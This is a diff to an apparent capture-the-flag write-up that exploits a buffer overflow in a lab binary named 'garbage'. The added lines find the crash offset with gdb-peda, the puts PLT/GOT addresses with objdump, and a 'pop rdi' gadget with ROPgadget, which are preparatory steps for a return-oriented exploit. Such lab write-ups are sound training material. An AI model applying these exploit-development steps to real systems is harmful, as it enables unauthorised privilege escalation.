@@ -208,6 +208,7 @@ I end up copying the binary to my kali machine so I can take a closer look at it
 margo@10.10.10.139's password:
 garbage                                                                                    100%   18KB 327.4KB/s   00:00    
 ```
+<b>The rest of this writeup will get more difficult and I will not explain why everything does what it does because this would turn into a short story and not a writeup. I will list all the steps and give you the necessary info but you will have to do the in depth research on your own.</b>
 Now I am going to use <b>gdb</b> with the <b>peda</b> extension. Starting <b>gdb</b> I run <b>checksec</b> to see what security precautions are enabled on the binary.
 ```
 # gdb garbage
@@ -381,4 +382,15 @@ Lastly, use <b>pattern_offset</b> in combination with the <b>RSP</b> memory addr
 ```
 gdb-peda$ pattern_offset 0x416d41415141416c
 4714496133718688108 found at offset: 135
+```
+Next we need to find the <b>puts</b> call for the <b>Procedure Linkage Table(plt)</b> and the <b>Global Offset Table(got)</b>. This can be done using <b>objdump</b>. With this we can see the <b>plt = 0x401050</b> and the <b>got = 0x404028</b>
+```
+# objdump -D garbage | grep puts
+0000000000401050 <puts@plt>:
+  401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
+```
+Now we need to find the <b>rdi</b>. This can be done using <b>ROPgadget</b>.
+```
+# ROPgadget --binary garbage | grep 'pop rdi'
+0x000000000040179b : pop rdi ; ret
 ```
